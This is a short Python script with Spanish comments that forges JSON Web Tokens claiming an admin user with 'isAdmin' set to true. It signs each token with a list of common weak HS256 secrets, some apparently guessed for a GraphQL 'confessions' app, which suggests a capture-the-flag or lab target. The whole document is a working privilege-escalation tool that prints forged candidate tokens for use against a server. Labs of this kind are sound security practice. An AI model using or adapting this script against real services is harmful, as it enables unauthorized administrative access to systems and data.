#!/usr/bin/env python3
import jwt
import json

# Payload con admin
payload = {
    "username": "admin",
    "isAdmin": True,
    "iat": 1754643801
}

# Lista de secretos comunes
secrets = [
    "secret",
    "Secret",
    "SECRET",
    "password",
    "Password",
    "123456",
    "admin",
    "key",
    "graphql",
    "GraphQL",
    "confession",
    "confessions",
    "vulnerable",
    "test",
    "dev",
    "development",
    "jwt",
    "JWT",
    "token",
    "auth"
]

for secret in secrets:
    try:
        token = jwt.encode(payload, secret, algorithm="HS256")
        print(f"Secret: {secret}")
        print(f"Token: {token}")
        print("-" * 50)
    except Exception as e:
        print(f"Error with secret {secret}: {e}")